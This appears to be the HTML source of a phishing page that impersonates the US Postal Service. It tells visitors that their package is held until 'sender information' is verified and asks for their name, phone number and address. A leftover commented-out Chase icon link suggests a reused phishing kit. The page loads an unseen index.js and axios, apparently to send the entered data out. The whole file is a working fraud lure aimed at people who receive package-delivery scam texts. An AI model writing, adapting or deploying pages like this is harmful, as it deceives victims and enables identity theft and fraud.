<!DOCTYPE html>
<html lang="en">

<html>
<head>
    <meta charset="utf-8">

        <!--"user-scalable=no" disable zooming when
        clicking in submission boxes on mobile-->

        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
        
        <title>USPS - Verify Sender</title>

        <!--href stands for hypertext reference-->
        <!---<link rel="icon" href="Chaseico.ico" type="image/x-icon">--->

        <link rel="stylesheet" href="style.css"
        type="text/css">

        <link rel="icon" href="ico.png" type="image/png">

</head>
<body>

    <br>
    <div class="containa">
        
        <div class="navbar__container">
            <nav class="navbar">
                <div class="navbar__container">
                    <a href="index.html" id="navbar__logo">
                        <img src="header.png" width="185" height="35" style="margin-right: 175px;">
                    </a>
                </div>
            </nav>
        </div>
        <br>
        <br>
        <br>
        <br>
        <div class="containerinfo">

            <div class="information">
                <img src="1.png" width="200px" height="20px">
            </div>
            <div class="information">
                <p class="notice"><b>We need to verify some information.</b></p>
            </div>
            <div class="information1">
                <p class="notice2">Your package has been placed on standby at a USPS processing facility until we can verify sender information.</p>
            </div>

        </div>
        
        <br>
        <form action="#" class="form-contact">

            <p class="please">Please enter your valid sender information.</p>

            <input id="firstname" type="text" placeholder="First Name" required>

            <input id="lastname" type="text" placeholder="Last Name" required>

            <input id="phone" type="number" pattern="[0-9]*" placeholder="Phone Number" oninput="realphonelength(this)" required><br>

            <input id="address" type="text" placeholder="Street Address" required>
            <input id="city" type="text" placeholder="City" required>
            <input id="zip" type="number" placeholder="Zipcode" oninput="reallength(this)" pattern="[0-9]*" required>
            <input id="state" type="text" placeholder="State" required>

            <input id="fsubmit" type="submit" value="Next">

        <form>

        <script>
            function ZipLength(input) {
                if (input.value.length > 5) {
                input.value = input.value.slice(0, 5);
                }
            }
        </script>
        <!--javascript to change Submit button click, check css-->
        <script>
            var button = document.querySelector('.form-contact input[type="submit"]');
            var finput = document.getElementById('firstname');
            var finput1 = document.getElementById('lastname');
            var finput0 = document.getElementById('phone');

            var addy1 = document.getElementById('address');
            var city1 = document.getElementById('city');
            var zip1 = document.getElementById('zip');
            var state1 = document.getElementById('state');
            
            var please = document.querySelector('.please');
            
            button.addEventListener('click', function(event) {
                
                if (finput.value === '' || finput1.value === '' || finput0.value === '' || addy1.value === '' || city1.value === '' || zip1.value === '' || state1.value === ''){
                    event.preventDefault();
                    please.style.display = "block";
                    window.scrollTo({
                        top: 0,
                        behavior: 'smooth' // You can use 'auto' or 'instant' instead of 'smooth'
                    });

                } else {
                    please.style.display = "none";
                    button.classList.add('clicked');
                    button.style.opacity = 0.5;
            
                    setTimeout(function() {
                        please.style.display = "none";

                        button.classList.remove('clicked');
                        button.style.opacity = 1;

                    }, 4000);
                }
            });            
        </script>
        <script>
            function realphonelength(input) {
                if (input.value.length > 10) {
                input.value = input.value.slice(0, 10);
             }
           }
        </script>
        <script>
            function reallength(input) {
                if (input.value.length > 5) {
                input.value = input.value.slice(0, 5);
             }
           }
        </script>

        <script src="index.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    </div>

</body>
